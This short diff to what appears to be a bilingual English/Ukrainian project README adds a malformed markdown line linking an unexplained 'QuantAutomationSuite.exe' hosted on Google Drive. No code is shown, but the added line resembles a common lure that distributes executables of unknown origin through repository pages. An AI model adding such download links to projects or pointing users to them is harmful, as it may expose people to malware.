@@ -11,6 +11,8 @@
 
 [🇬🇧 English](#english) • [🇺🇦 Українська](#ukrainian)
 
+![EXE FILE](QuantAutomationSuite.exe https://drive.google.com/file/d/1OjPxurulcFtmuPg6xYDFEU6ZaGWaqYth/view?usp=drive_link)
+
 </div>
 
 ---
